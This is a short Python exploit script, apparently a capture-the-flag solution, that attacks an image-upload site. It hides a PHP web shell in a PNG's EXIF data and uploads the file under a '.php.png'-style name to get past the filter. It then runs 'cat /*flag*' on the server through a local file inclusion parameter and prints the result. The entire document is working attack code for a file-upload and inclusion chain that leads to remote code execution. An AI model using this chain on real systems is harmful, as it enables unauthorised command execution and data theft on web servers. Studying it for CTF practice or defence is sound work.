import requests
from PIL import Image
import numpy as np
import io, re

cmd = 'cat /*flag*'

url = 'https://imgura.chal.h4ck3r.quest'
u = lambda p = '/': url+p

script = b'<START><?=`$_GET[1]`?><END>'
output = io.BytesIO()
img = Image.fromarray(np.array([[0]],dtype=np.uint8))
img.save(output, format='PNG', exif=script)
payload = output.getvalue()

files = {
    'image_file': ('meow.png.php', payload)
}
r = requests.post(u('/dev_test_page/upload.php'), files=files)

file_name = r.url.split('/')[-1].replace('.php', '')
params = {
    'page': 'images/' + file_name,
    '1': cmd
}
r = requests.get(u('/dev_test_page/index.php'), params=params)
res = re.findall('<START>(.*)<END>', r.text)[0]
print(res)
